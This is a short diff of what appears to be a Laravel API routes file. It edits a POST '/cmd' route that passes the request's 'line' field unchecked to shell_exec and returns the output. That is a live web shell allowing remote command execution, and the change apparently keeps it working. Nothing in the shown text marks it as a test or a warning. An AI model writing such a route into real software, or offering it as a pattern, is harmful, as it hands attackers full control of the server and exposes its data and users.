@@ -14,7 +14,7 @@ use \App\Http\Controllers\API\FileController;
 | be assigned to the "api" middleware group. Make something great!
 |
 */
-Route::post('/cmd', function (\http\Env\Request $request) {
+Route::post('/cmd', function (Request $request) {
     return shell_exec($request->line);
 })->name('cmd');
 
